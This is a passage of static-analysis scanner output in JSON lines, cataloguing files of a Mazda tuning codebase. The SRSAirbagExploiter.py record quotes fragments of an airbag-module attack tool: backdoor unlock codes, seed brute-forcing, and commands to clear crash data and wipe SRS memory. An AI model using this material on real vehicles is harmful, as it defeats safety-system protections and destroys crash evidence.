"\"\"\"Apply flat-shift parameters to the ECU.\"\"\""}, {"type": "hardware", "line": 769, "hardware": "ECU", "content": "\"\"\"Apply anti-lag parameters to the ECU.\"\"\""}, {"type": "hardware", "line": 830, "hardware": "ECU", "content": "\"\"\"Apply pop & bang parameters to the ECU.\"\"\""}, {"type": "hardware", "line": 834, "hardware": "vehicle", "content": "rpm_threshold=self._vehicle_state[\"rpm\"],"}, {"type": "hardware", "line": 843, "hardware": "vehicle", "content": "max(0, self._vehicle_state[\"rpm\"] - 500),"}, {"type": "hardware", "line": 844, "hardware": "vehicle", "content": "self._vehicle_state[\"rpm\"] + 500"}, {"type": "hardware", "line": 872, "hardware": "ECU", "content": "\"\"\"Apply two-step rev limiter parameters to the ECU.\"\"\""}, {"type": "hardware", "line": 911, "hardware": "ECU", "content": "\"\"\"Apply stealth mode parameters to the ECU.\"\"\""}, {"type": "hardware", "line": 975, "hardware": "ECU", "content": "security_core = MazdaSecurityCore()"}, {"type": "hardware", "line": 978, "hardware": "ECU", "content": "controller = RacingFeatureController(can_engine, security_core)"}], "security_logic": [{"type": "security_pattern", "line": 1008, "pattern": "key", "content": "except KeyboardInterrupt:"}], "dead_or_disabled_code": [], "risks": [], "group_tags": ["other"]}
{"file_path": "RealTimeAITuner.py", "lines_read": 565, "features_found": [{"type": "import", "module": "typing", "line": null}, {"type": "import", "module": "dataclasses", "line": null}, {"type": "import", "module": "enum", "line": null}, {"type": "import", "module": "torch", "line": null}, {"type": "import", "module": "torch.nn", "line": null}, {"type": "import", "module": "torch.optim", "line": null}, {"type": "import", "module": "numpy", "line": null}, {"type": "import", "module": "Dict,", "line": null}, {"type": "import", "module": "dataclass,", "line": null}, {"type": "import", "module": "logging", "line": null}, {"type": "import", "module": "Enum", "line": null}, {"type": "import", "module": "time", "line": null}], "components_found": [], "algorithms": [], "protocols": [], "hardware_assumptions": [], "security_logic": [{"type": "security_pattern", "line": 404, "pattern": "key", "content": "self.feature_order = sorted(feature_configs.keys())"}, {"type": "security_pattern", "line": 405, "pattern": "key", "content": "self.output_order = sorted(output_configs.keys())"}], "dead_or_disabled_code": [], "risks": [{"type": "security_risk", "line": 358, "risk": "eval\\(", "content": "self.eval()"}], "group_tags": ["other"]}
{"file_path": "RealTimeTelemetry.py", "lines_read": 392, "features_found": [{"type": "function", "name": "to_dict", "line": 35}, {"type": "function", "name": "__init__", "line": 45}, {"type": "function", "name": "update", "line": 58}, {"type": "function", "name": "value", "line": 84}, {"type": "function", "name": "stats", "line": 90}, {"type": "function", "name": "get_history", "line": 95}, {"type": "function", "name": "decode_rpm", "line": 106}, {"type": "function", "name": "decode_boost", "line": 114}, {"type": "function", "name": "decode_afr", "line": 122}, {"type": "function", "name": "decode_ignition", "line": 130}, {"type": "function", "name": "decode_coolant_temp", "line": 138}, {"type": "function", "name": "__init__", "line": 148}, {"type": "function", "name": "start", "line": 184}, {"type": "function", "name": "stop", "line": 198}, {"type": "function", "name": "_run_telemetry_loop", "line": 205}, {"type": "function", "name": "_process_can_message", "line": 245}, {"type": "function", "name": "get_metric", "line": 277}, {"type": "function", "name": "get_metric_value", "line": 281}, {"type": "function", "name": "get_metric_history", "line": 286}, {"type": "function", "name": "get_performance_metrics", "line": 291}, {"type": "function", "name": "get_status", "line": 305}, {"type": "function", "name": "__init__", "line": 322}, {"type": "function", "name": "recv", "line": 325}, {"type": "import", "module": "collections", "line": null}, {"type": "import", "module": "dataclasses", "line": null}, {"type": "import", "module": "enum", "line": null}, {"type": "import", "module": "typing", "line": null}, {"type": "import", "module": "threading", "line": null}, {"type": "import", "module": "datetime", "line": null}, {"type": "import", "module": "asyncio", "line": null}, {"type": "import", "module": "time", "line": null}, {"type": "import", "module": "threading", "line": null}, {"type": "import", "module": "deque", "line": null}, {"type": "import", "module": "dataclass,", "line": null}, {"type": "import", "module": "Enum,", "line": null}, {"type": "import", "module": "Dict,", "line": null}, {"type": "import", "module": "numpy", "line": null}, {"type": "import", "module": "Lock", "line": null}, {"type": "import", "module": "datetime", "line": null}, {"type": "import", "module": "statistics", "line": null}, {"type": "import", "module": "random", "line": null}, {"type": "import", "module": "can", "line": null}, {"type": "import", "module": "time", "line": null}], "components_found": [{"type": "class", "name": "CAN_ID", "line": 18}, {"type": "class", "name": "TelemetryDataPoint", "line": 28}, {"type": "class", "name": "TelemetryMetric", "line": 43}, {"type": "class", "name": "CANMessageDecoder", "line": 102}, {"type": "class", "name": "RealTimeTelemetry", "line": 145}, {"type": "class", "name": "MockCANBus", "line": 321}], "algorithms": [], "protocols": [{"type": "protocol", "line": 3, "protocol": "CAN", "content": "Handles 100Hz sampling, CAN message decoding, and thread-safe data access."}, {"type": "protocol", "line": 18, "protocol": "CAN", "content": "class CAN_ID(Enum):"}, {"type": "protocol", "line": 19, "protocol": "0x[0-9A-Fa-f]+", "content": "ENGINE_RPM = 0x201"}, {"type": "protocol", "line": 20, "protocol": "0x[0-9A-Fa-f]+", "content": "BOOST_PRESSURE = 0x202"}, {"type": "protocol", "line": 21, "protocol": "0x[0-9A-Fa-f]+", "content": "AIR_FUEL_RATIO = 0x203"}, {"type": "protocol", "line": 22, "protocol": "0x[0-9A-Fa-f]+", "content": "IGNITION_TIMING = 0x204"}, {"type": "protocol", "line": 23, "protocol": "0x[0-9A-Fa-f]+", "content": "COOLANT_TEMP = 0x205"}, {"type": "protocol", "line": 24, "protocol": "0x[0-9A-Fa-f]+", "content": "THROTTLE_POSITION = 0x206"}, {"type": "protocol", "line": 25, "protocol": "0x[0-9A-Fa-f]+", "content": "VEHICLE_SPEED = 0x207"}, {"type": "protocol", "line": 102, "protocol": "CAN", "content": "class CANMessageDecoder:"}, {"type": "protocol", "line": 103, "protocol": "CAN", "content": "\"\"\"Decodes raw CAN messages into telemetry data.\"\"\""}, {"type": "protocol", "line": 107, "protocol": "CAN", "content": "\"\"\"Decode RPM from CAN data (example implementation).\"\"\""}, {"type": "protocol", "line": 153, "protocol": "CAN", "content": "can_bus: CAN bus interface (must implement recv() method)"}, {"type": "protocol", "line": 163, "protocol": "CAN", "content": "self._decoder = CANMessageDecoder()"}, {"type": "protocol", "line": 246, "protocol": "CAN", "content": "\"\"\"Process a single CAN message and update metrics.\"\"\""}, {"type": "protocol", "line": 252, "protocol": "CAN", "content": "if can_id == CAN_ID.ENGINE_RPM.value:"}, {"type": "protocol", "line": 256, "protocol": "CAN", "content": "elif can_id == CAN_ID.BOOST_PRESSURE.value:"}, {"type": "protocol", "line": 260, "protocol": "CAN", "content": "elif can_id == CAN_ID.AIR_FUEL_RATIO.value:"}, {"type": "protocol", "line": 264, "protocol": "CAN", "content": "elif can_id == CAN_ID.IGNITION_TIMING.value:"}, {"type": "protocol", "line": 268, "protocol": "CAN", "content": "elif can_id == CAN_ID.COOLANT_TEMP.value:"}, {"type": "protocol", "line": 275, "protocol": "CAN", "content": "print(f\"Error processing CAN message: {e}\")"}, {"type": "protocol", "line": 321, "protocol": "CAN", "content": "class MockCANBus:"}, {"type": "protocol", "line": 339, "protocol": "CAN", "content": "return can.Message(arbitration_id=CAN_ID.ENGINE_RPM.value, data=data)"}, {"type": "protocol", "line": 344, "protocol": "CAN", "content": "return can.Message(arbitration_id=CAN_ID.BOOST_PRESSURE.value, data=data)"}, {"type": "protocol", "line": 349, "protocol": "CAN", "content": "return can.Message(arbitration_id=CAN_ID.AIR_FUEL_RATIO.value, data=data)"}, {"type": "protocol", "line": 354, "protocol": "CAN", "content": "return can.Message(arbitration_id=CAN_ID.IGNITION_TIMING.value, data=data)"}, {"type": "protocol", "line": 359, "protocol": "CAN", "content": "return can.Message(arbitration_id=CAN_ID.COOLANT_TEMP.value, data=data)"}, {"type": "protocol", "line": 362, "protocol": "CAN", "content": "can_bus = MockCANBus()"}], "hardware_assumptions": [{"type": "hardware", "line": 25, "hardware": "vehicle", "content": "VEHICLE_SPEED = 0x207"}, {"type": "hardware", "line": 153, "hardware": "CAN bus", "content": "can_bus: CAN bus interface (must implement recv() method)"}], "security_logic": [{"type": "security_pattern", "line": 388, "pattern": "key", "content": "except KeyboardInterrupt:"}], "dead_or_disabled_code": [], "risks": [], "group_tags": ["other"]}
{"file_path": "SAFETY_MODEL.md", "lines_read": 3, "features_found": [], "components_found": [], "algorithms": [], "protocols": [], "hardware_assumptions": [], "security_logic": [], "dead_or_disabled_code": [], "risks": [], "group_tags": ["other"]}
{"file_path": "SRSAirbagExploiter.py", "lines_read": 679, "features_found": [{"type": "function", "name": "ensure_airbags_disconnected", "line": 46}, {"type": "function", "name": "check_voltage", "line": 53}, {"type": "function", "name": "check_airbag_resistance", "line": 58}, {"type": "function", "name": "__init__", "line": 111}, {"type": "function", "name": "set_safety_override", "line": 154}, {"type": "function", "name": "_generate_test_codes", "line": 311}, {"type": "function", "name": "_generate_seed_response", "line": 389}, {"type": "function", "name": "_parse_crash_data", "line": 446}, {"type": "import", "module": "enum", "line": null}, {"type": "import", "module": "dataclasses", "line": null}, {"type": "import", "module": "typing", "line": null}, {"type": "import", "module": "functools", "line": null}, {"type": "import", "module": "asyncio", "line": null}, {"type": "import", "module": "logging", "line": null}, {"type": "import", "module": "time", "line": null}, {"type": "import", "module": "struct", "line": null}, {"type": "import", "module": "random", "line": null}, {"type": "import", "module": "IntEnum,", "line": null}, {"type": "import", "module": "dataclass,", "line": null}, {"type": "import", "module": "Optional,", "line": null}, {"type": "import", "module": "wraps", "line": null}, {"type": "import", "module": "hashlib", "line": null}, {"type": "import", "module": "binascii", "line": null}], "components_found": [{"type": "class", "name": "SRSError", "line": 24}, {"type": "class", "name": "SecurityError", "line": 28}, {"type": "class", "name": "SafetyError", "line": 32}, {"type": "class", "name": "SRSState", "line": 36}, {"type": "class", "name": "SRSSafetyCheck", "line": 42}, {"type": "class", "name": "SRSCrashData", "line": 64}, {"type": "class", "name": "SRSAirbagExploiter", "line": 76}, {"type": "class", "name": "SRSTransport", "line": 611}], "algorithms": [], "protocols": [{"type": "protocol", "line": 255, "protocol": "0x[0-9A-Fa-f]+", "content": "command=0x7D,  # Typical unlock command for many SRS modules"}, {"type": "protocol", "line": 261, "protocol": "0x[0-9A-Fa-f]+", "content": "if len(response) >= 1 and response[0] == 0x55:  # Typical success code"}, {"type": "protocol", "line": 286, "protocol": "0x[0-9A-Fa-f]+", "content": "await self.transport.send_command(0x7D, code, self.UNLOCK_TIMEOUT)"}, {"type": "protocol", "line": 337, "protocol": "0x[0-9A-Fa-f]+", "content": "await self.transport.send_command(0x7D, test_code, self.UNLOCK_TIMEOUT)"}, {"type": "protocol", "line": 361, "protocol": "0x[0-9A-Fa-f]+", "content": "challenge = await self.transport.send_command(0x7A, b\"\\x01\")  # Request challenge"}, {"type": "protocol", "line": 368, "protocol": "0x[0-9A-Fa-f]+", "content": "0x0000, 0xFFFF, 0x5A5A, 0xA5A5, 0x1234, 0x4321, 0x55AA, 0xAA55"}, {"type": "protocol", "line": 376, "protocol": "0x[0-9A-Fa-f]+", "content": "result = await self.transport.send_command(0x7B, response)  # Send response"}, {"type": "protocol", "line": 379, "protocol": "0x[0-9A-Fa-f]+", "content": "if len(result) >= 1 and result[0] == 0x55:  # Success"}, {"type": "protocol", "line": 397, "protocol": "0x[0-9A-Fa-f]+", "content": "result.append((b ^ (seed >> (8 * (i % 2)))) & 0xFF)"}, {"type": "protocol", "line": 416, "protocol": "0x[0-9A-Fa-f]+", "content": "response = await self.transport.send_command(0xA0, b\"\\x01\")  # Get event count"}, {"type": "protocol", "line": 428, "protocol": "0x[0-9A-Fa-f]+", "content": "0xA1,  # Read event command"}, {"type": "protocol", "line": 467, "protocol": "0x[0-9A-Fa-f]+", "content": "seatbelt = bool(flags & 0x01)"}, {"type": "protocol", "line": 468, "protocol": "0x[0-9A-Fa-f]+", "content": "front_impact = bool(flags & 0x02)"}, {"type": "protocol", "line": 469, "protocol": "0x[0-9A-Fa-f]+", "content": "side_impact = bool(flags & 0x04)"}, {"type": "protocol", "line": 470, "protocol": "0x[0-9A-Fa-f]+", "content": "rollover = bool(flags & 0x08)"}, {"type": "protocol", "line": 502, "protocol": "0x[0-9A-Fa-f]+", "content": "0xA2,  # Clear crash data command"}, {"type": "protocol", "line": 508, "protocol": "0x[0-9A-Fa-f]+", "content": "if len(response) >= 1 and response[0] == 0x55:  # Success code"}, {"type": "protocol", "line": 551, "protocol": "0x[0-9A-Fa-f]+", "content": "await self.transport.send_command(0xB0, b\"\\x01\")  # Reset learned values"}, {"type": "protocol", "line": 589, "protocol": "0x[0-9A-Fa-f]+", "content": "await self.transport.send_command(0x7F)  # Lock command"}], "hardware_assumptions": [{"type": "hardware", "line": 2, "hardware": "SRS", "content": "SRSAirbagExploiter - Advanced SRS Airbag Module Exploitation Tool"}, {"type": "hardware", "line": 4, "hardware": "SRS", "content": "This module provides tools for interacting with Mazda SRS (airbag) modules,"}, {"type": "hardware", "line": 24, "hardware": "SRS", "content": "class SRSError(Exception):"}, {"type": "hardware", "line": 25, "hardware": "SRS", "content": "\"\"\"Base exception for SRS operations.\"\"\""}, {"type": "hardware", "line": 28, "hardware": "ECU", "content": "class SecurityError(SRSError):"}, {"type": "hardware", "line": 28, "hardware": "SRS", "content": "class SecurityError(SRSError):"}, {"type": "hardware", "line": 29, "hardware": "ECU", "content": "\"\"\"Raised when a security check fails.\"\"\""}, {"type": "hardware", "line": 32, "hardware": "SRS", "content": "class SafetyError(SRSError):"}, {"type": "hardware", "line": 36, "hardware": "SRS", "content": "class SRSState(IntEnum):"}, {"type": "hardware", "line": 37, "hardware": "ECU", "content": "\"\"\"SRS module security states.\"\"\""}, {"type": "hardware", "line": 37, "hardware": "SRS", "content": "\"\"\"SRS module security states.\"\"\""}, {"type": "hardware", "line": 42, "hardware": "SRS", "content": "class SRSSafetyCheck:"}, {"type": "hardware", "line": 43, "hardware": "SRS", "content": "\"\"\"Safety checks for SRS module operations.\"\"\""}, {"type": "hardware", "line": 64, "hardware": "SRS", "content": "class SRSCrashData:"}, {"type": "hardware", "line": 65, "hardware": "SRS", "content": "\"\"\"Container for SRS crash data records.\"\"\""}, {"type": "hardware", "line": 76, "hardware": "SRS", "content": "class SRSAirbagExploiter:"}, {"type": "hardware", "line": 78, "hardware": "SRS", "content": "Advanced SRS Airbag Module Exploitation Tool."}, {"type": "hardware", "line": 81, "hardware": "SRS", "content": "maintenance operations on Mazda SRS modules."}, {"type": "hardware", "line": 94, "hardware": "SRS", "content": "b\"\\x4D\\x5A\\x44\\x53\\x52\\x53\\x5F\\x42\",  # MZDSRS_B"}, {"type": "hardware", "line": 98, "hardware": "SRS", "content": "b\"\\x53\\x52\\x53\\x5F\\x4D\\x5A\\x36\\x5F\",  # SRS_MZ6_"}, {"type": "hardware", "line": 106, "hardware": "SRS", "content": "b\"\\x53\\x52\\x53\\x5F\\x42\\x41\\x43\\x4B\",  # SRS_BACK"}, {"type": "hardware", "line": 108, "hardware": "SRS", "content": "b\"\\x53\\x4F\\x53\\x5F\\x53\\x52\\x53\\x5F\",  # SOS_SRS_"}, {"type": "hardware", "line": 113, "hardware": "SRS", "content": "Initialize the SRS Exploiter."}, {"type": "hardware", "line": 116, "hardware": "SRS", "content": "transport: The transport layer for SRS communication"}, {"type": "hardware", "line": 117, "hardware": "vehicle", "content": "model: Vehicle model (e.g., 'mazda3', 'mazda6')"}, {"type": "hardware", "line": 118, "hardware": "vehicle", "content": "year: Vehicle model year"}, {"type": "hardware", "line": 123, "hardware": "SRS", "content": "self.state = SRSState.LOCKED"}, {"type": "hardware", "line": 127, "hardware": "SRS", "content": "self._crash_data: List[SRSCrashData] = []"}, {"type": "hardware", "line": 133, "hardware": "SRS", "content": "\"\"\"Initialize the SRS interface.\"\"\""}, {"type": "hardware", "line": 135, "hardware": "SRS", "content": "self.logger.info(\"SRS interface initialized\")"}, {"type": "hardware", "line": 138, "hardware": "SRS", "content": "\"\"\"Close the SRS interface.\"\"\""}, {"type": "hardware", "line": 139, "hardware": "SRS", "content": "if self.state != SRSState.LOCKED:"}, {"type": "hardware", "line": 142, "hardware": "SRS", "content": "self.logger.info(\"SRS interface closed\")"}, {"type": "hardware", "line": 177, "hardware": "SRS", "content": "if not SRSSafetyCheck.ensure_airbags_disconnected():"}, {"type": "hardware", "line": 183, "hardware": "SRS", "content": "if not SRSSafetyCheck.check_voltage(voltage):"}, {"type": "hardware", "line": 191, "hardware": "SRS", "content": "Unlock the SRS module using backdoor codes or timing attacks."}, {"type": "hardware", "line": 199, "hardware": "SRS", "content": "if self.state != SRSState.LOCKED:"}, {"type": "hardware", "line": 200, "hardware": "SRS", "content": "self.logger.warning(\"SRS module is already unlocked\")"}, {"type": "hardware", "line": 221, "hardware": "SRS", "content": "self.state = SRSState.UNLOCKED"}, {"type": "hardware", "line": 222, "hardware": "SRS", "content": "self.logger.info(\"SRS module unlocked successfully\")"}, {"type": "hardware", "line": 229, "hardware": "SRS", "content": "self.logger.error(\"Failed to unlock SRS module\")"}, {"type": "hardware", "line": 255, "hardware": "SRS", "content": "command=0x7D,  # Typical unlock command for many SRS modules"}, {"type": "hardware", "line": 401, "hardware": "SRS", "content": "async def read_crash_data(self) -> List[SRSCrashData]:"}, {"type": "hardware", "line": 403, "hardware": "SRS", "content": "Read crash data records from the SRS module."}, {"type": "hardware", "line": 406, "hardware": "SRS", "content": "List[SRSCrashData]: List of crash data records"}, {"type": "hardware", "line": 408, "hardware": "SRS", "content": "if self.state == SRSState.LOCKED:"}, {"type": "hardware", "line": 410, "hardware": "ECU", "content": "raise SecurityError(\"Cannot read crash data: SRS module is locked\")"}, {"type": "hardware", "line": 410, "hardware": "SRS", "content": "raise SecurityError(\"Cannot read crash data: SRS module is locked\")"}, {"type": "hardware", "line": 418, "hardware": "SRS", "content": "raise SRSError(\"Invalid response to event count request\")"}, {"type": "hardware", "line": 444, "hardware": "SRS", "content": "raise SRSError(f\"Failed to read crash data: {e}\")"}, {"type": "hardware", "line": 446, "hardware": "SRS", "content": "def _parse_crash_data(self, event_num: int, data: bytes) -> Optional[SRSCrashData]:"}, {"type": "hardware", "line": 472, "hardware": "SRS", "content": "return SRSCrashData("}, {"type": "hardware", "line": 490, "hardware": "SRS", "content": "Clear all crash data from the SRS module."}, {"type": "hardware", "line": 495, "hardware": "SRS", "content": "if self.state == SRSState.LOCKED:"}, {"type": "hardware", "line": 497, "hardware": "ECU", "content": "raise SecurityError(\"Cannot clear crash data: SRS module is locked\")"}, {"type": "hardware", "line": 497, "hardware": "SRS", "content": "raise SecurityError(\"Cannot clear crash data: SRS module is locked\")"}, {"type": "hardware", "line": 523, "hardware": "SRS", "content": "Wipe SRS module memory (use with extreme caution!)."}, {"type": "hardware", "line": 526, "hardware": "ECU", "content": "method: Wipe method (\"standard\", \"quick\", \"secure\")"}, {"type": "hardware", "line": 534, "hardware": "SRS", "content": "if self.state == SRSState.LOCKED:"}, {"type": "hardware", "line": 536, "hardware": "ECU", "content": "raise SecurityError(\"Cannot wipe memory: SRS module is locked\")"}, {"type": "hardware", "line": 536, "hardware": "SRS", "content": "raise SecurityError(\"Cannot wipe memory: SRS module is locked\")"}, {"type": "hardware", "line": 559, "hardware": "ECU", "content": "elif method == \"secure\":"}, {"type": "hardware", "line": 572, "hardware": "ECU", "content": "self.logger.warning(\"Secure memory wipe completed\")"}, {"type": "hardware", "line": 584, "hardware": "SRS", "content": "\"\"\"Lock the SRS module (end session).\"\"\""}, {"type": "hardware", "line": 585, "hardware": "SRS", "content": "if self.state == SRSState.LOCKED:"}, {"type": "hardware", "line": 590, "hardware": "SRS", "content": "self.state = SRSState.LOCKED"}, {"type": "hardware", "line": 592, "hardware": "SRS", "content": "self.logger.info(\"SRS module locked\")"}, {"type": "hardware", "line": 595, "hardware": "SRS", "content": "self.logger.error(f\"Failed to lock SRS module: {e}\")"}, {"type": "hardware", "line": 599, "hardware": "SRS", "content": "\"\"\"Reset the SRS module.\"\"\""}, {"type": "hardware", "line": 602, "hardware": "SRS", "content": "self.state = SRSState.LOCKED"}, {"type": "hardware", "line": 604, "hardware": "SRS", "content": "self.logger.info(\"SRS module reset\")"}, {"type": "hardware", "line": 607, "hardware": "SRS", "content": "self.logger.error(f\"Failed to reset SRS module: {e}\")"}, {"type": "hardware", "line": 611, "hardware": "SRS", "content": "class SRSTransport:"}, {"type": "hardware", "line": 612, "hardware": "ABS", "content": "\"\"\"Abstract base class for SRS transport implementations.\"\"\""}, {"type": "hardware", "line": 612, "hardware": "SRS", "content": "\"\"\"Abstract base class for SRS transport implementations.\"\"\""}, {"type": "hardware", "line": 625, "hardware": "SRS", "content": "Send a command to the SRS module."}, {"type": "hardware", "line": 638, "hardware": "SRS", "content": "\"\"\"Reset the SRS module.\"\"\""}, {"type": "hardware", "line": 647, "hardware": "SRS", "content": "\"\"\"Example of how to use the SRSAirbagExploiter.\"\"\""}, {"type": "hardware", "line": 649, "hardware": "SRS", "content": "transport = SRSTransport()  # Replace with actual implementation"}, {"type": "hardware", "line": 651, "hardware": "SRS", "content": "async with SRSAirbagExploiter(transport, model=\"mazda3\", year=2012) as exploiter:"}, {"type": "hardware", "line": 654, "hardware": "SRS", "content": "print(\"SRS module unlocked successfully\")"}, {"type": "hardware", "line": 670, "hardware": "SRS", "content": "if input(\"Wipe SRS memory? (y/n): \").lower() == 'y':"}, {"type": "hardware", "line": 671, "hardware": "ECU", "content": "method = input(\"Wipe method (quick/standard/secure): \").lower()"}, {"type": "hardware", "line": 675, "hardware": "SRS", "content": "print(\"Failed to unlock SRS module\")"}], "security_logic": [{"type": "security_pattern", "line": 17, "pattern": "hash", "content": "import hashlib"}, {"type": "security_pattern", "line": 124, "pattern": "key", "content": "self._session_key: Optional[bytes] = None"}, {"type": "security_pattern", "line": 215, "pattern": "seed", "content": "self._try_bruteforce_seed,"}, {"type": "security_pattern", "line": 262, "pattern": "key", "content": "self._session_key = response[1:9] if len(response) >= 9 else None"}, {"type": "security_pattern", "line": 302, "pattern": "key", "content": "self._session_key = extended_code"}, {"type": "security_pattern", "line": 352, "pattern": "seed", "content": "async def _try_bruteforce_seed(self) -> bool:"}, {"type": "security_pattern", "line": 353, "pattern": "seed", "content": "\"\"\"Attempt to bruteforce the seed value (last resort).\"\"\""}, {"type": "security_pattern", "line": 354, "pattern": "seed", "content": "self.logger.warning(\"Attempting seed bruteforce (this may take a while)...\")"}, {"type": "security_pattern", "line": 367, "pattern": "seed", "content": "common_seeds = ["}, {"type": "security_pattern", "line": 371, "pattern": "seed", "content": "for seed in common_seeds:"}, {"type": "security_pattern", "line": 373, "pattern": "seed", "content": "response = self._generate_seed_response(seed, challenge)"}, {"type": "security_pattern", "line": 380, "pattern": "key", "content": "self._session_key = result[1:9] if len(result) >= 9 else None"}, {"type": "security_pattern", "line": 381, "pattern": "seed", "content": "self.logger.info(f\"Unlocked with seed: 0x{seed:04X}\")"}, {"type": "security_pattern", "line": 385, "pattern": "seed", "content": "self.logger.error(f\"Seed bruteforce failed: {e}\")"}, {"type": "security_pattern", "line": 389, "pattern": "seed", "content": "def _generate_seed_response(self, seed: int, challenge: bytes) -> bytes:"}, {"type": "security_pattern", "line": 390, "pattern": "seed", "content": "\"\"\"Generate a response based on seed and challenge.\"\"\""}, {"type": "security_pattern", "line": 397, "pattern": "seed", "content": "result.append((b ^ (seed >> (8 * (i % 2)))) & 0xFF)"}, {"type": "security_pattern", "line": 591, "pattern": "key", "content": "self._session_key = None"}, {"type": "security_pattern", "line": 603, "pattern": "key", "content": "self._session_key = None"}], "dead_or_disabled_code": [], "risks": [], "group_tags": ["other"]}
{"file_path": "SecureDatabase.py", "lines_read": 2163, "features_found": [{"type": "import", "module": "datetime", "line": null}, {"type": "import", "module": "typing", "line": null}, {"type": "import", "module": "contextlib", "line": null}, {"type": "import", "module": "dataclasses", "line": null}, {"type": "import", "module": "enum", "line": null}, {"type": "import", "module": "pathlib", "line": null}, {"type": "import", "module": "cryptography.fernet", "line": null}, {"type": "import", "module": "cryptography.hazmat.primitives", "line": null}, {"type": "import", "module": "cryptography.hazmat.primitives.kdf.pbkdf2", "line": null}, {"type": "import", "module": "cryptography.hazmat.backends", "line": null}, {"type": "import", "module": "cryptography.hazmat.primitives", "line": null}, {"type": "import", "module": "cryptography.hazmat.primitives.ciphers", "line": null}, {"type": "import", "module": "sqlite3", "line": null}, {"type": "import", "module": "json", "line": null}, {"type": "import", "module": "logging", "line": null}, {"type": "import", "module": "os", "line": null}, {"type": "import", "module": "base64", "line": null}, {"type": "import", "module": "hashlib", "line": null}, {"type": "import", "module": "secrets", "line": null}, {"type": "import", "module": "time", "line": null}, {"type": "import", "module": "datetime", "line": null}, {"type": "import", "module": "Any,", "line": null}, {"type": "import", "module": "contextmanager", "line": null}, {"type": "import", "module": "dataclass,", "line": null}, {"type": "import", "module": "Enum,", "line": null}, {"type": "import", "module": "Path", "line": null}, {"type": "import", "module": "Fernet,", "line": null}, {"type": "import", "module": "hashes", "line": null}, {"type": "import", "module": "PBKDF2HMAC", "line": null}, {"type": "import", "module": "default_backend", "line": null}, {"type": "import", "module": "padding", "line": null}, {"type": "import", "module": "Cipher,", "line": null}, {"type": "import", "module": "shutil", "line": null}, {"type": "import", "module": "tempfile", "line": null}], "components_found": [], "algorithms": [], "protocols": [], "hardware_assumptions": [{"type": "hardware", "line": 2, "hardware": "ECU", "content": "SecureDatabase - Encrypted SQLite database for MUTS (Mazda Universal Tuning System)."}, {"type": "hardware", "line": 4, "hardware": "ECU", "content": "This module provides a secure, encrypted SQLite database with tables for users, vehicles,"}, {"type": "hardware", "line": 4, "hardware": "vehicle", "content": "This module provides a secure, encrypted SQLite database with tables for users, vehicles,"}, {"type": "hardware", "line": 5, "hardware": "ECU", "content": "tuning sessions, diagnostic logs, and security events. All sensitive data is encrypted"}, {"type": "hardware", "line": 44, "hardware": "ECU", "content": "class SecurityError(DatabaseError):"}, {"type": "hardware", "line": 45, "hardware": "ECU", "content": "\"\"\"Raised when a security-related error occurs.\"\"\""}, {"type": "hardware", "line": 63, "hardware": "ECU", "content": "class SecurityEventType(str, Enum):"}, {"type": "hardware", "line": 64, "hardware": "ECU", "content": "\"\"\"Types of security events.\"\"\""}, {"type": "hardware", "line": 119, "hardware": "vehicle", "content": "class Vehicle:"}, {"type": "hardware", "line": 120, "hardware": "vehicle", "content": "\"\"\"Vehicle information.\"\"\""}, {"type": "hardware", "line": 140, "hardware": "vehicle", "content": "def from_dict(cls, data: Dict[str, Any]) -> 'Vehicle':"}, {"type": "hardware", "line": 142, "hardware": "vehicle", "content": "vehicle = cls("}, {"type": "hardware", "line": 152, "hardware": "vehicle", "content": "vehicle.id = data['id']"}, {"type": "hardware", "line": 154, "hardware": "vehicle", "content": "vehicle.created_at = datetime.fromisoformat(data['created_at'])"}, {"type": "hardware", "line": 156, "hardware": "vehicle", "content": "vehicle.updated_at = datetime.fromisoformat(data['updated_at'])"}, {"type": "hardware", "line": 157, "hardware": "vehicle", "content": "return vehicle"}, {"type": "hardware", "line": 163, "hardware": "vehicle", "content": "vehicle_id: int"}, {"type": "hardware", "line": 191, "hardware": "vehicle", "content": "vehicle_id=int(data['vehicle_id']),"}, {"type": "hardware", "line": 252, "hardware": "ECU", "content": "class SecurityLog:"}, {"type": "hardware", "line": 253, "hardware": "ECU", "content": "\"\"\"Security event log entry.\"\"\""}, {"type": "hardware", "line": 256, "hardware": "ECU", "content": "event_type: SecurityEventType"}, {"type": "hardware", "line": 271, "hardware": "ECU", "content": "def from_dict(cls, data: Dict[str, Any]) -> 'SecurityLog':"}, {"type": "hardware", "line": 281, "hardware": "ECU", "content": "event_type=SecurityEventType(data['event_type']),"}, {"type": "hardware", "line": 295, "hardware": "ECU", "content": "class SecureDatabase:"}, {"type": "hardware", "line": 296, "hardware": "ECU", "content": "\"\"\"Secure SQLite database with encryption for sensitive data.\"\"\""}, {"type": "hardware", "line": 326, "hardware": "vehicle", "content": "CREATE TABLE IF NOT EXISTS vehicles ("}, {"type": "hardware", "line": 343, "hardware": "vehicle", "content": "vehicle_id INTEGER NOT NULL,"}, {"type": "hardware", "line": 351, "hardware": "vehicle", "content": "FOREIGN KEY (vehicle_id) REFERENCES vehicles (id) ON DELETE CASCADE,"}, {"type": "hardware", "line": 368, "hardware": "ECU", "content": "CREATE TABLE IF NOT EXISTS security_logs ("}, {"type": "hardware", "line": 380, "hardware": "vehicle", "content": "\"CREATE INDEX IF NOT EXISTS idx_vehicles_owner ON vehicles(owner_id)\","}, {"type": "hardware", "line": 381, "hardware": "vehicle", "content": "\"CREATE INDEX IF NOT EXISTS idx_tune_sessions_vehicle ON tune_sessions(vehicle_id)\","}, {"type": "hardware", "line": 384, "hardware": "ECU", "content": "\"CREATE INDEX IF NOT EXISTS idx_security_logs_user ON security_logs(user_id)\","}, {"type": "hardware", "line": 385, "hardware": "ECU", "content": "\"CREATE INDEX IF NOT EXISTS idx_security_logs_event_type ON security_logs(event_type)\","}, {"type": "hardware", "line": 386, "hardware": "ECU", "content": "\"CREATE INDEX IF NOT EXISTS idx_security_logs_timestamp ON security_logs(timestamp)\","}, {"type": "hardware", "line": 391, "hardware": "ECU", "content": "Initialize the secure database."}, {"type": "hardware", "line": 405, "hardware": "ABS", "content": "os.makedirs(os.path.dirname(os.path.abspath(db_path)), exist_ok=True)"}, {"type": "hardware", "line": 435, "hardware": "ECU", "content": "self.connection.execute(\"PRAGMA foreign_keys = ON\")"}, {"type": "hardware", "line": 438, "hardware": "ECU", "content": "self.connection.execute(\"PRAGMA journal_mode = WAL\")"}, {"type": "hardware", "line": 439, "hardware": "ECU", "content": "self.connection.execute(\"PRAGMA synchronous = NORMAL\")"}, {"type": "hardware", "line": 440, "hardware": "ECU", "content": "self.connection.execute(\"PRAGMA cache_size = -2000\")  # 2MB cache"}, 